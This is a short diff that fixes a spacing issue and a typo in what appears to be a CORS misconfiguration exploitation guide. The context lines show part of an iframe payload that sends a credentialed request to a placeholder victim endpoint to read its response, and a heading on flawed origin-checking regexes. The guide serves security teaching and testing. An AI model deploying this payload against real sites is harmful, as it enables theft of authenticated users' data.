@@ -113,7 +113,7 @@ origin in the request:
 
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
-  var req = new XMLHttpRequest ();
+  var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://victim.example.com/endpoint',true);
   req.withCredentials = true;
@@ -176,7 +176,7 @@ function reqListener() {
 ```
 
 ### Vulnerable Example: Expanding the Origin / Regex Issues
-Occasionally, certain expantions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header. 
+Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
 
 #### Vulnerable Implementation (Example 1)
 
